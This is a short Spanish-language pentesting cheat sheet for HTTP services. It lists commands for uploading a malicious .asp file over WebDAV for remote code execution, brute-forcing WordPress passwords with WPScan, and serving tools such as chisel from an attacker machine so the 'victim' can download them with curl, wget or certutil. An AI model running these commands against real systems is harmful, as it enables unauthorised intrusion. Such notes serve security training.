# HTTP

Propietario: Adrian Gisbert Cabello

- Cadaver
    - Para obtener una shell en la webdav: `cadaver [http://X.X.X.X/webdav](http://x.x.x.x/webdav)`
    - Para enviar un archivo malicioso y obtener una RCE: `put /home/kali/pwned.asp`
- Davtest
    - Herramienta para explotar /davweb: `davtest -url [http://X.X.X.X/webdav/](http://x.x.x.x/webdav/)`
    - `davtest -auth admin:123123 -url [http://X.X.X.X/webdav/](http://x.x.x.x/webdav/)`
    
- WPScan
    - Comando para páginas wordpress: `wpscan --url [http://192.168.X.X/wordpress/](http://192.168.x.x/wordpress/)`
    - `wpscan --url [http://192.168.X.X/wordpress/](http://192.168.x.x/wordpress/) --passwords /usr/share/wordlists/rockyou.txt`
    
- Python Server
    
    Como pasar archivos (p.ej. socat y chisel) de mi Kali a una máquina Linux:
    
    - En Kali ejecutamos una terminal y vamos al directorio donde estén los archivos que queramos compartir e iniciamos un servidor web con python por el puerto 5000:
    - `python3 -m http.server 5000`
    - Ahora en la máquina víctima hacemos un curl o wget del archivo que queramos descargar:
    - `curl -o archivo.txt http://192.168.X.X:5000/archivo.txt`
    - `wget http://192.168.X.X:5000/archivo.txt`
    
    Como pasar archivos (p.ej. socat y chisel) de mi Kali a una máquina Windows:
    
    - En Kali ejecutamos una terminal y vamos al directorio donde estén los archivos que queramos compartir e iniciamos un servidor web con python por el puerto 5000:
    - `python3 -m http.server 5000`
    - Ahora en la máquina víctima hacemos un curl, wget o certutil
    - `curl -o archivo.txt http://192.168.X.X:5000/archivo.txt`
    - `wget http://192.168.X.X:5000/archivo.txt`
    - `certutil -split -urlcache -f http://192.168.X.X:5000/archivo.txt archivo.txt`